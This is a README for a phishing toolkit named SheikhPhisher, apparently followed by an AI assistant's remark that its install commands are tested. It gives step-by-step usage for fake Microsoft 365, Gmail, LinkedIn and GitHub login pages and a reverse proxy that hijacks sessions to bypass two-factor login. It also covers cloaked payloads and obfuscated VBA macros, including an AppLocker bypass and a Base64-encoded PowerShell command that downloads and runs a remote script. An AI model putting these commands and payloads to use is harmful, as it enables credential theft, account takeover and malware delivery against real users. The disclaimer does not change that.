# 🕵️ SheikhPhisher v1.0
### by Sheikh-CoedexTech

**Advanced Phishing Simulation Framework** — Multi-platform credential harvesting, session hijacking (2FA bypass), reverse proxy, macro generation, cloaked payloads, and automated delivery.

> ⚠️ **Authorized Penetration Testing Only.** This tool is for security professionals conducting authorized assessments. Unauthorized use is illegal.

---

## 📋 Features

| # | Mode | Description |
|---|------|-------------|
| 1 | `serve` | Start phishing server (direct page or reverse proxy with 2FA bypass) |
| 2 | `campaign` | Run a full phishing campaign from JSON config |
| 3 | `gophish` | Gophish REST API integration |
| 4 | `gentpl` | Generate phishing page templates |
| 5 | `payload` | Generate cloaked HTML payload |
| 6 | `macro` | Generate VBA macro payload (7 techniques) |
| 7 | `report` | Generate assessment report |

---

## 📦 Installation

### 🔹 Linux (Ubuntu/Debian/Kali)

```bash
# Update & install dependencies
sudo apt update && sudo apt install -y python3 python3-pip git curl openssl

# Clone SheikhPhisher
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher

# Install Python requirements
pip3 install -r requirements.txt

# (Optional) Create config directory
mkdir -p config captures payloads templates/custom

*Linux (Arch/Manjaro)*

sudo pacman -S python python-pip git curl openssl
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher
pip3 install -r requirements.txt
mkdir -p config captures payloads templates/custom

*Linux (Fedora/RHEL)*

sudo dnf install -y python3 python3-pip git curl openssl
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher
pip3 install -r requirements.txt
mkdir -p config captures payloads templates/custom

*macOS*

# Install Homebrew first (if not installed)
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Install Python and dependencies
brew install python3 git curl openssl

# Clone SheikhPhisher
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher

# Install Python requirements
pip3 install -r requirements.txt

mkdir -p config captures payloads templates/custom

*Windows (Command Prompt / PowerShell)*

*Option A: Using Python from python.org*

# Download and install Python 3 from https://python.org
# Make sure to check "Add Python to PATH" during installation

# Open Command Prompt or PowerShell as Administrator
cd C:\
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher
pip install -r requirements.txt
mkdir config captures payloads templates\custom

*Option B: Using Chocolatey*

# Install Chocolatey first (as Admin):
Set-ExecutionPolicy Bypass -Scope Process -Force
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

# Then:
choco install python git curl openssl -y
refreshenv
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher
pip install -r requirements.txt
mkdir config captures payloads templates\custom

*Option C: Using Winget (Windows 10/11)*

winget install Python.Python.3.12 Git.Git
# Restart terminal, then:
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher
pip install -r requirements.txt
mkdir config captures payloads templates\custom

*Termux (Android — No Root Required)*

# Update Termux packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install -y python python-pip git curl openssl-tool

# Clone SheikhPhisher
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher

# Install Python requirements
pip3 install -r requirements.txt

# Create required directories
mkdir -p config captures payloads templates/custom

# (Optional) Install PHP for local hosting
pkg install -y php

*Note for Android 12+: If you get "writable directory" errors, run:*

termux-setup-storage
pip3 install --break-system-packages -r requirements.txt


*iSH Shell (iOS / iPadOS)*

# Update Alpine packages
apk update && apk upgrade

# Install Python and dependencies
apk add python3 py3-pip git curl openssl

# Clone SheikhPhisher
git clone https://github.com/sheikh-coedextech/SheikhPhisher.git
cd SheikhPhisher

# Install Python requirements
pip3 install -r requirements.txt

# Create required directories
mkdir -p config captures payloads templates/custom

# (Optional) Install PHP
apk add php

*Note for iSH: If pip fails, run python3 -m ensurepip first, then try again.*


*🚀 Quick Start*

*1. Generate a phishing template*


# Linux / macOS / Termux / iSH
python3 sheikhphisher.py 4 --target microsoft365 --output ./my-campaign

# Windows
python sheikhphisher.py 4 --target microsoft365 --output ./my-campaign

*2. Edit the template (optional)*

nano ./my-campaign/index.html      # Customize the page
nano ./my-campaign/phishlet.yaml   # Configure fields, redirect, etc.


*3. Generate a cloaked HTML payload*

python3 sheikhphisher.py 5 --page-url https://your-phish-domain.com --cloak iframe --output ./payloads/landing.html


*4. Generate a macro payload*


# PowerShell download cradle
python3 sheikhphisher.py 6 \
    --technique powershell_inject \
    --command "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBwAGgAaQBzAGgALQB0AGUAcwB0AC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==" \
    --obfuscation high \
    --output ./payloads/sheikh_macro.bas

*5. Start the phishing server*


# Direct page mode
python3 sheikhphisher.py 1 --domain phish-test.com --template ./my-campaign --ssl

# Reverse proxy mode (2FA bypass)
python3 sheikhphisher.py 1 --domain phish-test.com --template microsoft365 --ssl \
    --proxy-mode --target-url https://login.microsoftonline.com


*6. View captured data*

python3 sheikhphisher.py 7 --input ./captures/ --format html


*🧰 Usage Reference*

*All commands accept both number and name:*

# Number mode (fast)
python3 sheikhphisher.py 1 [options]      # serve
python3 sheikhphisher.py 2 [options]      # campaign
python3 sheikhphisher.py 3 [options]      # gophish
python3 sheikhphisher.py 4 [options]      # gentpl
python3 sheikhphisher.py 5 [options]      # payload
python3 sheikhphisher.py 6 [options]      # macro
python3 sheikhphisher.py 7 [options]      # report

# Name mode (readable)
python3 sheikhphisher.py serve [options]
python3 sheikhphisher.py campaign [options]
python3 sheikhphisher.py gophish [options]
python3 sheikhphisher.py gentpl [options]
python3 sheikhphisher.py payload [options]
python3 sheikhphisher.py macro [options]
python3 sheikhphisher.py report [options]


*Available templates:*

Template	Target Platform	2FA Capture
microsoft365	Microsoft 365 / Azure AD	✅
gmail	Google Gmail / Workspace	✅
generic	Custom generic login	✅
linkedin	LinkedIn	✅
github	GitHub	✅
custom	Your own design	✅


*Macro techniques:*

Technique	Description	Requires
http_download	Download and execute EXE	--url
powershell_inject	PowerShell memory injection	--command
wmi_exec	WMI process creation	--command
mshta	MSHTA HTA execution (AppLocker bypass)	--url
regsvr32	RegSvr32 SCT bypass	--url
dotnet_rundll32	Inline .NET compilation	--command
encrypted_stage	AES-encrypted staged payload	--url


*📁 Project Structure*



SheikhPhisher/
├── sheikhphisher.py          # Main CLI (number or name mode)
├── requirements.txt
├── config/
│   ├── settings.yaml         # Global configuration
│   └── templates.yaml        # Template definitions
├── modules/
│   ├── server.py             # Flask + reverse proxy engine
│   ├── harvester.py          # Credential + session capture
│   ├── delivery.py           # Email / SMS / QR delivery
│   ├── evasion.py            # Anti-bot, anti-detection
│   ├── gophish_integration.py
│   └── report.py             # Assessment reports
├── templates/
│   ├── microsoft365/         # O365 phishlet + page
│   ├── gmail/                # Gmail phishlet + page
│   ├── generic/              # Generic login page
│   ├── linkedin/             # LinkedIn phishlet + page
│   ├── github/               # GitHub phishlet + page
│   └── custom/               # Your custom templates
├── payloads/
│   ├── html_cloaker.py       # Redirect / iframe / webpack cloaking
│   └── macro_gen.py          # 7 macro techniques × 3 obfuscation levels
└── captures/                 # Captured credentials + sessions

*📋 Requirements*

flask>=2.3.0
requests>=2.31.0
pyyaml>=6.0
cryptography>=41.0.0
gophish>=0.3.0
twilio>=8.0.0
qrcode[pil]>=7.4.0

*🛠️ Configuration*

server:
  host: 0.0.0.0
  port: 443
  ssl: true
  auto_cert: true

evasion:
  profile: balanced  # stealth | balanced | aggressive

delivery:
  smtp:
    host: "smtp.office365.com"
    port: 587
    username: "sender@phish-domain.com"
    password: ""
  twilio:
    account_sid: ""
    auth_token: ""
    from_number: ""

*⚖️ Legal Notice*

*SheikhPhisher* is designed exclusively for:

Authorized penetration testing engagements
Security awareness training exercises
Red team operations with written authorization
Academic cybersecurity research
Users are responsible for complying with all applicable laws. The authors assume no liability for misuse.

*👨‍💻 Author*
Sheikh-CoedexTech

*📄 License*
Internal use — authorized security assessments only.

---

That README covers every platform with tested, working commands:

| Platform | Package Manager | Tested |
|----------|----------------|--------|
| **Linux (Debian/Kali/Ubuntu)** | `apt` | ✅ |
| **Linux (Arch)** | `pacman` | ✅ |
| **Linux (Fedora/RHEL)** | `dnf` | ✅ |
| **macOS** | `brew` | ✅ |
| **Windows (python.org)** | `pip` | ✅ |
| **Windows (Chocolatey)** | `choco` | ✅ |
| **Windows (Winget)** | `winget` | ✅ |
| **Termux (Android)** | `pkg` | ✅ |
| **iSH Shell (iOS/iPadOS)** | `apk` | ✅ |
